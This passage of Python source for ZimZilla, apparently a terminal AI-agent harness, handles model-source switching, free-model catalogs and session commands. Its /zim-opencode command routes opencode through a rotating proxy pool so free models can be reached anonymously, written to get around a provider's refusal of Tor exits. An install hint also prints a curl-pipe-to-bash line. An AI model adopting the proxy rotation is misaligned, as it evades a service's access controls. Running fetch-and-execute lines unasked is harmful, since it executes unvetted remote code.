            self._sys_line(f"no {label} key found", warn=True)
            return
        # Every hosted gateway in the tree speaks Messages. Re-resolve rather
        # than inheriting a pinned protocol from an endpoint the operator has
        # since left.
        self.cfg.protocol = "auto"
        origin, model = applied
        self.agent._client = None      # rebuild against the new host
        mod.set_current(kind)
        self._refresh_after_source_change(label, f"key from {origin}")

        # A first switch with no model chosen lands on whatever the profile
        # named; with none, offer the free list rather than guessing a paid one.
        if not model:
            self._sys_line("fetching the free model list…")
            self._fetch_models(kind)

    # ---- protocol / endpoint ------------------------------------------------
    def _cmd_protocol(self, args) -> None:
        """/protocol [auto|anthropic|openai] — the wire protocol in use.

        The two protocols are not interchangeable at a given URL: a LiteLLM
        proxy in this tree serves ``/v1/messages`` and answers 404 to
        ``/v1/chat/completions``, while a bare OpenAI-compatible host does the
        reverse. So this command reports the *resolved* protocol and the exact
        route it will call, which is the pair that explains a 404.
        """
        from .. import openai_compat as oa_mod

        choice = args[0].strip().lower() if args else ""
        resolved = self.agent.protocol
        if not choice:
            route = (oa_mod.chat_completions_url(self.cfg.base_url)
                     if resolved == "openai"
                     else self.cfg.base_url.rstrip("/") + "/v1/messages")
            self._sys_line(f"protocol {resolved}  ·  {route}", ok=True)
            self._sys_line(
                "  /protocol openai | anthropic | auto   —   "
                "/openai-endpoint <url> [model] to point at a Chat Completions "
                "host", ok=True)
            return

        if choice not in oa_mod.PROTOCOLS:
            self._sys_line(
                f"unknown protocol: {choice} — one of {', '.join(oa_mod.PROTOCOLS)}",
                warn=True)
            return

        self.cfg.protocol = choice
        # Drop the cached client: it was built for the old protocol and its
        # error classes are part of that decision.
        self.agent._client = None
        resolved = self.agent.protocol
        self._sys_line(f"protocol set to {choice} (resolved: {resolved})", ok=True)

        if resolved == "openai" and oa_mod.is_local_proxy(self.cfg.base_url):
            self._sys_line(
                "  this endpoint is one of ZimZilla's local LiteLLM proxies and "
                "speaks Messages only — point at the upstream directly with "
                "/openai-endpoint <url> to skip the proxy", warn=True)

    @work(exclusive=True)
    async def _cmd_openai_endpoint(self, args) -> None:
        """/openai-endpoint <url> [model] — talk Chat Completions, no proxy.

        Sets the endpoint and pins the protocol, then probes the Models route
        before the first turn: a mistyped host or a missing ``/v1`` is the most
        common way this goes wrong, and both are answered here in a second
        instead of after a failed turn that looks like a model problem.

        The endpoint is deliberately not written to the ``current-source``
        selection file. That file records a *source* the launcher can rebuild —
        with a profile, a proxy and a known catalog. A hand-typed URL has none
        of those, and remembering it would hijack the next launch if the
        operator had only meant to try it.
        """
        from .. import openai_compat as oa_mod

        parts = [str(p) for p in (args or [])]
        if not parts:
            self._sys_line(
                f"endpoint {self.cfg.base_url}  ·  protocol {self.agent.protocol}"
                f"  ·  model {self.cfg.model}", ok=True)
            self._sys_line(
                "  /openai-endpoint https://api.example.com/v1 <model>", ok=True)
            return

        url = parts[0].rstrip("/")
        if not url.startswith(("http://", "https://")):
            self._sys_line(
                f"not a URL: {url} — include http:// or https://", warn=True)
            return
        model = parts[1] if len(parts) > 1 else self.cfg.model

        self.busy = True
        bar = self.query_one(StatusBar)
        bar.set_activity(f"probing {url}", busy=True)
        self._sys_line(f"probing {oa_mod.models_url(url)}…")
        try:
            ok, detail = await asyncio.to_thread(
                oa_mod.probe, url, self.cfg.auth_token or self.cfg.api_key)
        finally:
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self.query_one("#input", Input).focus()

        self.cfg.base_url = url
        self.cfg.protocol = "openai"
        self.cfg.model = model
        self.agent._client = None
        self.query_one(HeaderBar).set_model(self.cfg.display_model)
        self.query_one(StatusBar).model = self.cfg.display_model
        self.query_one(StatusBar).render_bar()
        try:
            self._completer().base_url = self.cfg.base_url
        except NoMatches:
            pass

        self._sys_line(
            f"endpoint set to {url}  ·  protocol openai  ·  model {model}", ok=True)
        if ok:
            self._sys_line(f"  {detail}", ok=True)
        else:
            # The endpoint stays set on purpose: a 401 here usually means the
            # key, not the URL, and undoing the operator's command because a
            # probe was refused would be the wrong guess made for them.
            self._sys_line(f"  probe failed: {detail}", warn=True)
            self._sys_line(
                "  the endpoint is still set — set a key with "
                "ANTHROPIC_AUTH_TOKEN or OPENAI_API_KEY if that is what it "
                "refused", warn=True)

    def _cmd_models(self, args) -> None:
        """/models [source] — the free models of an upstream.

        Defaults to whichever upstream is *active*, because the question it
        answers is "what can I run right now without paying", and a model on an
        upstream this session is not pointed at cannot be run at all.

        An explicit source is accepted for the one case the active-source rule
        gets wrong: **OpenRouter's, UnoRouter's, AIHubMix's, BeatAPI's,
        IteraCompute's and InfronAI's catalogs are public**, so their free lists
        are worth seeing before a key exists — and before the session is pointed
        there, since pointing at any of them needs a key. Without the argument
        those lists would be unreachable until after the very setup they are
        meant to inform.
        """
        key = args[0].strip().lower() if args else ""
        if not key:
            key = sources_mod.active_key(self.cfg.base_url)
            if key is None:
                self._sys_line(
                    "this endpoint is not a known upstream — /zim-source lists "
                    "them, or name one: /models openrouter", warn=True)
                return

        known = {"logfare", "tokenjuice", "tokenharbour", "openrouter",
                 "unorouter", "antseed", "aihubmix", "beatapi",
                 "iteracompute", "infronai", "nvidia"}
        if key not in known:
            self._sys_line(
                f"unknown upstream: {key} — try one of "
                f"{', '.join(sorted(known))}", warn=True)
            return

        # A gateway whose catalog is gated needs its key before there is
        # anything to show. OpenRouter and UnoRouter are deliberately absent
        # from this check: both catalogs are public, which is the whole point of
        # being able to name them here before any key exists.
        #
        # TokenHarbour is asked directly rather than through `_gateway`, which
        # knows only the gateways whose commands it parameterises and returns
        # None for TokenHarbour — which predates it and keeps its own commands.
        # `self._gateway("tokenharbour")[0]` was a TypeError, so this command
        # crashed for every operator who ran it without a TokenHarbour key.
        if key == "tokenharbour" and not th_mod.has_key():
            self._sys_line(
                "no TokenHarbour key — set one with /tokenharbour-api-setup <key>",
                warn=True)
            return
        # AntSeed has no key to check, but it does have to be *running*: the
        # buyer proxy only exists while `antseed buyer start` is up, and a fetch
        # against a dead port would otherwise surface as a bare connection error
        # rather than the one instruction that fixes it.
        if key == "antseed" and not as_mod.reachable():
            self._sys_line(
                "no AntSeed buyer on "
                f"localhost:{as_mod.proxy_port()} — start one with "
                "`antseed buyer start`", warn=True)
            return
        self._sys_line(f"fetching the {key} catalog…")
        self._fetch_models(key)

    @work(exclusive=True, thread=True)
    def _fetch_models(self, kind: str) -> None:
        """The blocking catalog fetch, off the UI thread, then back on it."""
        models, err = self._models_for_kind(kind)
        self.call_from_thread(self._show_models, kind, models, err)

    def _models_for_kind(self, kind: str):
        """``(models, error)`` for a source key — the free, usable ones.

        Runs on the worker thread; touches no widget.
        """
        if kind == "openrouter":
            # Keyless on purpose: the catalog is public, so this works before
            # /openrouter-api-setup has run. Send the key when there is one, so
            # the listing matches what this session would be charged.
            creds = or_mod.load_credentials()
            return or_mod.usable_free_models(creds[0] if creds else "")
        if kind == "unorouter":
            # Keyless too, and for the same reason: /api/pricing answers 200
            # with no credential at all. The key is only needed to send.
            creds = uno_mod.load_credentials()
            return uno_mod.usable_free_models(creds[0] if creds else "")
        if kind == "aihubmix":
            # Keyless as well: /api/v1/models answers 200 with no Authorization
            # header at all (857 models when this was written). The key is sent
            # when there is one so the listing matches this account.
            creds = ah_mod.load_credentials()
            return ah_mod.usable_free_models(creds[0] if creds else "")
        if kind == "beatapi":
            # Keyless: /v1/text/models is public, so the free list works before
            # /beatapi-api-setup has run. The key is sent when there is one so
            # the listing matches this account's reachable families.
            creds = bp_mod.load_credentials()
            return bp_mod.usable_free_models(creds[0] if creds else "")
        if kind == "iteracompute":
            # Keyless too: /v1/models answers with no credential, which is what
            # lets /iteracompute-models work before the key is set. Sent when
            # present so the listing matches this account.
            creds = ic_mod.load_credentials()
            return ic_mod.usable_free_models(creds[0] if creds else "")
        if kind == "infronai":
            # Keyless: the catalog at llm.onerouter.pro/v1/models answers with no
            # credential at all, so /infronai-models works before
            # /infronai-api-setup has run. Sent when present so the listing
            # matches this account's reachable models.
            creds = inf_mod.load_credentials()
            return inf_mod.usable_free_models(creds[0] if creds else "")
        if kind == "nvidia":
            # Keyless as well: /v1/models is public. Sent when present so the
            # listing is made with the credential the turns will use. The
            # catalog lists models this account cannot call — a 404 "Function
            # not found for account" that the Models route does not disclose —
            # so the list is what exists, not what works; /nvidia-models says
            # so rather than pretending otherwise.
            creds = nv_mod.load_credentials()
            return nv_mod.chat_models(creds[0] if creds else "")
        if kind == "tokenharbour":
            creds = th_mod.load_credentials()
            if creds is None:
                return None, "no key"
            return th_mod.free_models(creds[0])
        if kind == "antseed":
            # Keyless, like OpenRouter's. `usable_free_models` rather than
            # `free_models`: a free model is only usable here if a free peer can
            # be pinned, because the router's trust floor refuses free peers on
            # its own — see the module header.
            return as_mod.usable_free_models()
        if kind == "logfare":
            # Logfare's catalog is a health feed — it carries no pricing at all,
            # so there is no free tier to filter to. Reported as an empty list
            # it would read as "nothing is free right now", which is a claim
            # about the upstream that is simply not true; say what is actually
            # the case instead.
            return None, ("Logfare publishes no pricing — its catalog is a "
                          "health feed, so there is no free list to show. "
                          "Use /logfare-models for what it serves.")
        return None, f"no catalog for {kind}"

    def _show_models(self, kind: str, models, err: str) -> None:
        p = self.palette
        if models is None:
            self._sys_line(f"{kind}: {err}", warn=True)
            return
        label = {"openrouter": "OPENROUTER", "unorouter": "UNOROUTER",
                 "aihubmix": "AIHUBMIX", "beatapi": "BEATAPI",
                 "iteracompute": "ITERACOMPUTE",
                 "infronai": "INFRONAI",
                 "nvidia": "NVIDIA NIM",
                 "tokenharbour": "TOKENHARBOUR", "logfare": "LOGFARE",
                 "antseed": "ANTSEED"}.get(kind, kind.upper())
        t = Text()
        t.append(f"  {label} — FREE MODELS\n\n", style=f"bold {p.accent}")
        if not models:
            t.append("  nothing free is usable right now.\n", style=p.amber)
            if kind in ("openrouter", "unorouter"):
                t.append(
                    "  (free models that cannot call tools are excluded — "
                    "they cannot drive this harness)\n", style=p.dim)
            if kind == "aihubmix":
                # A different exclusion, and saying the wrong one would send the
                # operator looking for a tool-calling filter that is not there.
                t.append(
                    "  (only free models that can answer a chat request are "
                    "listed — image,\n  speech, OCR and embedding models are "
                    "filtered out; tool support is\n  NOT a filter here, "
                    "because AIHubMix under-reports it)\n", style=p.dim)
            if kind == "beatapi":
                t.append(
                    "  (the catalog is live and the free tier is a limited-time\n"
                    "  offer — an empty list means none are on right now, not "
                    "that the\n  source is broken)\n", style=p.dim)
            if kind == "iteracompute":
                t.append(
                    "  (the catalog is live; free means the gateway's own "
                    "is_free flag.\n  The free tier is one model with a monthly "
                    "token allowance, so an\n  empty list means none is offered "
                    "right now — not that the source is\n  broken)\n",
                    style=p.dim)
            if kind == "infronai":
                t.append(
                    "  (the catalog is live; free means a zero read AND write "
                    "price, or a\n  ':free' suffix on an unpriced entry. The "
                    "free tier needs a funded\n  balance and is capped at 1000 "
                    "requests/day across all free models, so\n  an empty list "
                    "means none is offered right now — not that the source\n"
                    "  is broken)\n", style=p.dim)
            if kind == "nvidia":
                t.append(
                    "  (the catalog is public and live. 'free' here is the "
                    "developer tier:\n  calls draw on the account's trial "
                    "allowance, not a per-model price,\n  because the catalog "
                    "publishes none. An empty list means the endpoint\n"
                    "  answered with no chat-capable entries — not that the "
                    "key is wrong)\n", style=p.dim)
        else:
            for m in models:
                mark = "◉" if m.id == self.cfg.model else "○"
                style = f"bold {p.accent}" if m.id == self.cfg.model else p.primary
                # The id is padded to a column, but NOT truncated: the id is
                # what the operator retypes into `/model <name>`, so cutting it
                # short would hand them a name that does not exist. `:<34` alone
                # pads and never truncates, which is how an OpenRouter id longer
                # than the column (most of them are) ran straight into its own
                # blurb — `…:free` and `free · 512k ctx` rendered as `freefree`.
                # An over-long id instead wraps its blurb to the next line,
                # indented under the id.
                # For AntSeed the *pin* is what gets typed, not the bare id: the
                # router's trust floor refuses free peers, so `glm-4.5-flash`
                # answers 502 while `<peerId>@glm-4.5-flash` answers 200. Showing
                # the bare id would hand the operator a name that looks right and
                # fails on use, so the column carries the pinnable id and the
                # model name is repeated underneath when the two differ.
                shown = m.id
                if kind == "antseed":
                    pin = m.pin()
                    if pin:
                        shown = pin
                t.append(f"  {mark} {shown}", style=style)
                if len(shown) <= _MODEL_COL:
                    t.append(" " * (_MODEL_COL - len(shown) + 1))
                else:
                    t.append("\n    ")
                # UnoRouter's upstream count leads, in its own colour. The
                # number is what the operator asked for — how many channels
                # stand behind this model, i.e. whether a rate limit on one of
                # them is survivable. The colour is OUR tier, not UnoRouter's
                # status (the catalog publishes none), which is why the count is
                # printed beside the dot rather than replaced by it: a bare
                # colour would read as a health signal the gateway never issued.
                if kind == "unorouter":
                    note = getattr(m, "upstream_note", "")
                    if note:
                        t.append(note, style=_upstream_style(p, m.redundancy))
                        t.append(" · ", style=p.dim)
                t.append(m.blurb + "\n", style=p.dim)
                if kind == "antseed" and shown != m.id:
                    t.append(f"      → {m.id}\n", style=p.dim)
            t.append("\n  pick one with  ", style=p.dim)
            t.append("/model <name>\n", style=f"bold {p.primary}")
        if kind == "openrouter":
            t.append("  free = :free suffix and a zero price · tools-capable only\n",
                     style=p.dim)
        if kind == "unorouter":
            t.append(
                "  free = the catalog's own is_free · text output and "
                "tools-capable only,\n  so image, embedding and speech models "
                "are filtered out\n",
                style=p.dim)
            # The upstream count is the reason this list is sorted the way it
            # is, so the legend has to say what the number means AND what the
            # colour does not. Both halves matter: without the first, the
            # operator cannot use it; without the second, a colour gets read as
            # a health dot UnoRouter never publishes.
            t.append("\n  upstreams = how many channels can serve this model. "
                     "One channel means\n  a rate limit there is the end of the "
                     "request, not a retry elsewhere —\n  which is why the "
                     "single-channel models at the bottom are the ones that\n"
                     "  stall. Sorted most-redundant first.\n", style=p.dim)
            t.append("  the colour is this harness's read of that count, ",
                     style=p.dim)
            t.append("not UnoRouter's status", style=f"bold {p.amber}")
            t.append(" — it publishes none\n", style=p.dim)
        if kind == "antseed":
            t.append(
                "  free = a seller charging 0 in and 0 out · the id shown is "
                "pinned\n  to that seller (<peerId>@<model>), because the "
                "router's trust floor\n  skips free peers on its own\n",
                style=p.dim)
        if kind == "aihubmix":
            # The two things a reader of this list would otherwise get wrong.
            # Both were measured, and both contradict what the catalog looks
            # like it is saying — the suffix that reads as free, and the
            # tool_call field that reads as "no tools".
            t.append(
                "  free = priced 0 in and 0 out · NOT the -free suffix, which "
                "is on some\n  models that charge · chat models only\n",
                style=p.dim)
            t.append(
                "  tool support is not a filter: AIHubMix leaves tool_call "
                "null on models\n  that do call tools, so filtering on it "
                "would hide working ones\n", style=p.dim)
        if kind == "beatapi":
            # Two things a reader would otherwise get wrong, both stated by
            # BeatAPI's own docs rather than inferred here.
            t.append(
                "  free = a -free id in the catalog's free family · the catalog "
                "is live,\n  so the set moves; the ids are rate limited and "
                "limited-time\n", style=p.dim)
            t.append(
                "  tool support is not a filter: free entries publish no "
                "capabilities, so\n  the flag beside a free model is borrowed "
                "from its paid sibling — advisory,\n  and used only to order "
                "the list, never to hide a model\n", style=p.dim)
        if kind == "iteracompute":
            # The two facts the gateway's own docs state, both of which change
            # how a reader should treat this list.
            t.append(
                "  free = the catalog's own is_free · the free tier is 30M "
                "tokens per UTC\n  month on the free model, shared by every "
                "key on the account\n", style=p.dim)
            t.append(
                "  context shown is the free tier's 128K cap, not the model's "
                "larger\n  window: an API key does not say which tier the "
                "account is on\n", style=p.dim)
        if kind == "infronai":
            # Three facts, all measured from the catalog rather than inferred:
            # what "free" means here, that the suffix alone is not it, and the
            # two limits the free tier carries.
            t.append(
                "  free = zero read AND write price · NOT the :free suffix on "
                "its own,\n  which also appears on entries the catalog leaves "
                "unpriced\n", style=p.dim)
            t.append(
                "  free models need a $5 balance (anti-abuse, not spent by "
                "free usage) and\n  share 1000 requests/day per account, "
                "resetting 00:00 UTC\n", style=p.dim)
            t.append(
                "  text output only · tool support is shown but never used to "
                "hide a\n  model, because the catalog under-reports it\n",
                style=p.dim)
        if kind == "nvidia":
            # The three things a reader of this list would otherwise get wrong,
            # all of them measured against the live endpoint on 2026-10-22.
            t.append(
                "  free = the developer tier, not a per-model price: calls draw "
                "on the\n  account's trial allowance (~40 req/min). The catalog "
                "publishes no\n  pricing, so nothing here is billed per token\n",
                style=p.dim)
            t.append(
                "  the catalog lists models this account cannot call — those "
                "answer 404\n  \"not found for account\"; a retired one answers "
                "410; a busy one 503.\n  If a model refuses, that is why, and "
                "the message says which\n", style=p.dim)
            t.append(
                "  ids are provider/model and go on the wire unchanged — no "
                "prefix to add\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)
        self._refresh_model_choices()

    def _refresh_model_choices(self) -> None:
        """Re-render the completion popup against the live catalog.

        `/model <TAB>` offers whatever ``sources_mod.models_for`` reports, which
        for TokenHarbour is the fetched list. Nothing is cached in the popup, so
        there is nothing to invalidate — but the popup may be open with the old
        list showing, and this repaints it so the two agree.
        """
        try:
            popup = self._completer()
        except NoMatches:
            return
        try:
            inp = self.query_one("#input", Input)
            popup.refresh_for(inp.value, self.cfg.workdir, inp.cursor_position)
        except Exception:
            pass

    def _refresh_after_source_change(self, label: str, detail: str) -> None:
        """Repaint everything that names the model or the endpoint.

        Takes a label and a detail string rather than a Source: the local
        proxies have a port and a dataclass to describe them, TokenHarbour is a
        remote host with neither, and this only ever needed the two words.
        """
        p = self.palette
        # Same refresh _cmd_model does — HeaderBar + StatusBar carry the model.
        self.query_one(HeaderBar).set_model(self.cfg.display_model)
        self.query_one(StatusBar).model = self.cfg.display_model
        self.query_one(StatusBar).render_bar()
        # The popup offers this endpoint's catalog on `/model <TAB>`, so it has
        # to learn the new host at the same moment the client does.
        try:
            self._completer().base_url = self.cfg.base_url
        except NoMatches:
            pass
        self._sys_line(f"source switched to {label} ({detail})", ok=True)
        t = Text()
        t.append("  ↳ ", style=p.dim)
        t.append(f"model {self.cfg.display_model}", style=p.primary)
        t.append("   ·   ", style=p.dim)
        t.append(self.cfg.base_url, style=p.dim)
        t.append("   ·   saved for next launch\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def _apply_palette(self) -> None:
        p = self.palette
        try:
            theme = p.rich_theme()
            self.register_theme(theme)
            self.theme = theme.name
            # Re-registering under the same name does NOT repaint: Textual's
            # `theme` reactive is skipped when the value it is set to is the one
            # it already holds, so the app keeps rendering the stylesheet
            # compiled against the OLD palette. That is invisible for
            # green/amber/cyan, whose theme name changes on every switch — but
            # `/theme system` re-applied after a wallpaper change re-registers
            # "zim-system" with new colours and the name is identical, so the
            # screen stays on the previous wallpaper's background. Measured:
            # the palette object updated and the rendered screen did not.
            # refresh_css() recompiles against the theme just registered, which
            # is the part the reactive would otherwise have done.
            self.refresh_css()
        except Exception:
            pass

        self.query_one(ChatPane).apply_palette(p)
        try:
            self.query_one(LoopRail).apply_palette(p)
            self.query_one(TelemetryRail).apply_palette(p)
        except Exception:
            pass
        try:
            self.query_one(ZimPane).apply_palette(p)
        except Exception:
            pass

        h = self.query_one(HeaderBar)
        h.palette = p
        h.set_theme_name(self.theme_name)

        b = self.query_one(StatusBar)
        b.palette = p
        b.render_bar()

        inp = self.query_one(Input)
        inp.styles.border = ("round", p.primary)
        inp.styles.color = p.primary

    def _cmd_save(self, args) -> None:
        try:
            path = session_mod.save(self.cfg, self.agent, args[0] if args else None)
            self._sys_line(f"saved session → {path}", ok=True)
        except Exception as e:  # noqa: BLE001
            self._sys_line(f"save failed: {e}", warn=True)

    def _cmd_panes(self, args=None) -> None:
        """Re-open this session under tmux so ctrl+b h/v work.

        The prefix keys are tmux bindings, not ZimZilla bindings, so they only
        exist in a session tmux started — which is why pressing ctrl+b h in an
        ordinary session just types an `h`. Nothing inside the running app can
        fix that: tmux needs the terminal, and the app is holding it. So this
        saves the conversation, asks to exit, and lets `__main__` relaunch once
        the terminal is free.
        """
        from .. import panes as _panes

        if _panes.current_session() is not None:
            self._sys_line(
                "already in a ZimZilla pane — ctrl+b h splits right, "
                "ctrl+b v splits down",
                ok=True,
            )
            return
        if not _panes.tmux_available():
            self._sys_line(
                "tmux is not installed — `sudo apt install tmux` first", warn=True
            )
            return

        # Keep the conversation across the relaunch. A save failure is not fatal
        # — panes still work — so it is reported and the relaunch continues
        # rather than the command dying on a read-only home.
        resume = None
        try:
            resume = str(session_mod.save(self.cfg, self.agent, "panes"))
            self._sys_line("saving the conversation…", ok=True)
        except Exception as e:  # noqa: BLE001
            self._sys_line(
                f"could not save the conversation ({e}) — relaunching without it",
                warn=True,
            )

        self._sys_line(
            "relaunching under tmux — ctrl+b h splits right, ctrl+b v splits down",
            ok=True,
        )
        # Handed back as the app's exit value; __main__ does the relaunch.
        self.exit(_panes.Relaunch(resume=resume))

    # ---- /zim-opencode ----------------------------------------------------
    def _chat_pane(self) -> ChatPane | None:
        """The transcript pane, or None if the app is tearing down.

        The spinner timer can fire in the gap between shutdown starting and the
        pane unmounting, so this returns None rather than raising NoMatches out
        of a paint tick.
        """
        try:
            return self.query_one(ChatPane)
        except Exception:  # noqa: BLE001
            return None

    def _set_hunt_spinner(self, on: bool) -> None:
        """Start or stop the proxy-hunt animation (UI thread)."""
        pane = self._chat_pane()
        self._hunt_frame = 0
        if on:
            if pane is not None:
                pane.set_spinner(f"{_HUNT_FRAMES[0]}  {_HUNTING}")
            if self._hunt_timer is None:
                self._hunt_timer = self.set_interval(0.12, self._pulse_hunt_spinner)
        else:
            if self._hunt_timer is not None:
                self._hunt_timer.stop()
                self._hunt_timer = None
            if pane is not None:
                pane.clear_spinner()

    def _pulse_hunt_spinner(self) -> None:
        """Advance the spinner.

        Driven by a UI timer rather than by the worker's progress callbacks on
        purpose: the worker blocks for tens of seconds at a time inside a single
        socket call, so a callback-driven animation would freeze for exactly the
        stretch the operator is waiting through and staring at.
        """
        if self._hunt_timer is None:
            return
        self._hunt_frame = (self._hunt_frame + 1) % len(_HUNT_FRAMES)
        pane = self._chat_pane()
        if pane is not None:
            pane.set_spinner(f"{_HUNT_FRAMES[self._hunt_frame]}  {_HUNTING}")

    @work(exclusive=True, thread=True)
    def _zim_opencode_worker(self, args: list[str], model: str | None,
                             refresh: bool = False) -> None:
        """Rotate, prove the route, then hand the terminal to opencode.

        Runs on a worker thread because both the pool build and the pre-flight
        turn block on sockets for tens of seconds — doing that on the UI thread
        would freeze the app with no explanation.

        The terminal hand-off itself must happen on the *UI* thread, so the
        worker stops at the point of launching and calls back into
        :meth:`_zim_opencode_launch`.
        """
        binary = oc_mod.find_binary()
        if binary is None:
            self.call_from_thread(self._sys_line,
                                  "opencode not found - install it please !", True, False)
            return

        # Deliberately no counts and no addresses on screen: how many proxies
        # there are says nothing useful (a pool of 24 ran 12% usable at one
        # point and 79% at another), and an address that has not been proven
        # yet is noise at best and a misleading failure at worst. Only the
        # phases are shown, and the proxy is named once it works.
        self.call_from_thread(self._sys_line, _HUNTING, ok=True)
        self.call_from_thread(self._set_hunt_spinner, True)

        pool = oc_mod.get_pool(refresh=refresh, binary=binary,
                               model=model or oc_mod.DEFAULT_MODEL)
        proxy = None
        if pool.proxies:
            proxy, note = oc_mod.find_working_proxy(
                binary, model=model or oc_mod.DEFAULT_MODEL,
                attempts=8, pool=pool)
        else:
            note = "no proxies in the pool"

        self.call_from_thread(self._set_hunt_spinner, False)

        if proxy is None:
            # Say why rather than opening a TUI that will fail on its first
            # message. `note` distinguishes "no proxies" from "the model id is
            # retired", which need different fixes.
            self.call_from_thread(
                self._sys_line,
                f"could not find a working route ({note}) — "
                "try /zim-opencode again, or --model <id>", True, False)
            return
        self.call_from_thread(self._zim_opencode_launch, binary, proxy, args, model)

    def _zim_opencode_launch(self, binary: str, proxy, args: list[str],
                             model: str | None) -> None:
        """Suspend the TUI, run opencode in the freed terminal, then resume.

        ``suspend`` is what makes this possible at all: opencode's TUI wants the
        terminal, and ZimZilla is holding it. Suspending hands the real terminal
        back exactly as it was, so opencode draws to a clean screen and the
        operator gets its full interface — then ZimZilla redraws over it when
        the child exits.
        """
        # The exit IP is a courtesy, not a promise: these proxies are flaky
        # per-request, so the launch can succeed and the follow-up lookup still
        # fail. When it does, say only what is known rather than printing
        # "(exit None)" — which reads like a failure at the exact moment the
        # route just proved itself.
        ip = oc_mod.probe_exit_ip(proxy) if proxy is not None else None
        if proxy is None:
            where = "your own address"
        elif ip:
            where = f"{proxy.url} (exit {ip})"
        else:
            where = proxy.url
        self._sys_line(f"opening opencode through {where} — quit it to come back", ok=True)

        # The alias is (re)written here rather than at install time so a moved
        # checkout re-points itself, and so a session that never runs this
        # command leaves no file behind.
        ok, detail = oc_mod.install_alias()
        if ok:
            self._sys_line(f"{oc_mod.ALIAS} → {detail}", ok=True)
        else:
            self._sys_line(f"could not install {oc_mod.ALIAS}: {detail}", warn=True)

        try:
            with self.suspend():
                rc = oc_mod.run(proxy, binary, args=args, model=model,
                                cwd=str(self.cfg.workdir))
        except Exception as e:  # noqa: BLE001
            self._sys_line(f"opencode could not start: {type(e).__name__}: {e}", warn=True)
            return
        if rc != 0:
            self._sys_line(f"opencode exited with status {rc}", warn=True)
        else:
            self._sys_line("back in zimzilla", ok=True)
        self.refresh(layout=True)

    def _cmd_zim_opencode(self, args: list[str]) -> None:
        """/zim-opencode [--model <id>] [--refresh] [-- <opencode args>]

        Opens opencode behind a rotating IP, with no account and no key: its
        free models are reachable anonymously, and the only obstacle is that the
        free tier refuses Tor exits — hence an ordinary HTTP proxy pool rather
        than Tor.
        """
        model = None
        refresh = False
        passthrough: list[str] = []
        i = 0
        while i < len(args):
            a = args[i]
            if a == "--model" and i + 1 < len(args):
                model = args[i + 1]
                i += 2
                continue
            if a == "--refresh":
                refresh = True
                i += 1
                continue
            # Everything after `--` goes to opencode untouched, so its own
            # flags stay reachable without this parser having to know them.
            if a == "--":
                passthrough.extend(args[i + 1:])
                break
            passthrough.append(a)
            i += 1

        if oc_mod.find_binary() is None:
            # The exact wording asked for, plus the install lines that actually
            # work — a bare "install it" leaves the operator hunting for the
            # right package manager.
            self._sys_line("opencode not found - install it please !", warn=True)
            self._sys_line("  curl -fsSL https://opencode.ai/install | bash", warn=True)
            self._sys_line("  or: mise use -g opencode   ·   brew install opencode", warn=True)
            return

        if refresh:
            self._sys_line("refreshing the proxy pool…")
        self._zim_opencode_worker(passthrough, model, refresh)

    def _cmd_load(self, args) -> None:
        p = self.palette
        if not args:
            listing = session_mod.list_sessions(self.cfg)
            t = Text()
            t.append("  SAVED SESSIONS\n\n", style=f"bold {p.accent}")
            if not listing:
                t.append("  (none)\n", style=p.dim)
            for s in listing[:20]:
                ts = datetime.fromtimestamp(s["saved_at"]).strftime("%Y-%m-%d %H:%M")
                t.append(f"  {s['file']:<34}", style=p.primary)
                t.append(f"{ts}  {s['model']}  {s['messages']} msgs\n", style=p.dim)
            t.append("\n  usage: /load <name>\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return
        ok, msg = session_mod.load(self.cfg, self.agent, args[0])
        if ok:
            self.query_one(HeaderBar).set_model(self.cfg.display_model)
            self.query_one(StatusBar).model = self.cfg.display_model
            self._sys_line(msg, ok=True)
        else:
            self._sys_line(msg, warn=True)

    @work(exclusive=True)
    async def _cmd_compact(self) -> None:
        self.busy = True
        bar = self.query_one(StatusBar)
        chat = self.query_one(ChatPane)
        # The manual command gets the same animation as the automatic one: it is
        # the same operation with the same silence from the summariser, and the
        # operator who typed /compact is the one most in need of seeing it move.
        window = self.agent.context_window()
        used = self.agent._last_input_tokens
        chat.compact_begin(used=used, window=window,
                           threshold=self.agent.compact_threshold(window),
                           trigger="threshold")
        tele = self._telemetry_rail()
        if tele is not None:
            tele.set_compacting(True)
        self._start_compact_animation()
        bar.set_activity("compacting history", busy=True, hold=True)
        self._sys_line("compacting conversation…")
        ok, result = False, "the compaction request raised before answering"
        try:
            ok, result = await self.agent.compact()
        finally:
            # The timer is deliberately NOT stopped here: `compact_end` leaves
            # the finished panel up for COMPACT_LINGER seconds, and the timer is
            # what closes it. It stops itself on the first tick after that.
            chat.compact_end(ok, result, used=used,
                             after=self.agent.history_tokens() if ok else 0)
            if tele is not None:
                tele.set_compacting(False)
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self.query_one("#input", Input).focus()
        p = self.palette
        if ok:
            t = Text()
            t.append("  ✔ history compacted\n\n", style=f"bold {p.accent}")
            t.append(result, style=p.primary)
            self.query_one(ChatPane).write_block(t)
        else:
            self._sys_line(f"compact failed: {result}", warn=True)

    # ---- /team ------------------------------------------------------------
    def _cmd_team(self, args) -> None:
        """/team <task> — plan, fan out, synthesise. Long-running, so it runs
        as a worker like _cmd_compact rather than inline."""
        task = " ".join(args).strip() if args else ""
        if not task:
            self._sys_line("usage: /team <task>", warn=True)
            return
        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return
        self._run_team(task)

    @work(exclusive=True)
    async def _run_team(self, task: str) -> None:
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)

        self.busy = True
        self._cancelled = False
        self._set_rain(False)
        self._team_tokens = (0, 0, 0.0)   # fresh run, fresh team totals

        # name -> (index, colour). Built from the roster so a worker keeps one
        # colour for its whole run, and every one of its lines is tagged with it.
        colors: dict[str, str] = {}
        counter = {"running": 0, "total": 0}

        async def on_event(ev: dict) -> None:
            if self._cancelled:
                return
            etype = ev.get("type")

            if etype == "team_plan":
                for i, w in enumerate(ev.get("workers") or []):
                    colors[w["name"]] = agent_color(i, p)
                counter["total"] = len(ev.get("workers") or [])
                if ev.get("summary"):
                    self._sys_line(ev["summary"])
                if not ev.get("workers"):
                    self._sys_line(
                        "no team needed — running it directly" if ev.get("parsed")
                        else "could not read a roster — running it directly",
                        warn=True,
                    )
                else:
                    names = ", ".join(w["name"] for w in ev["workers"])
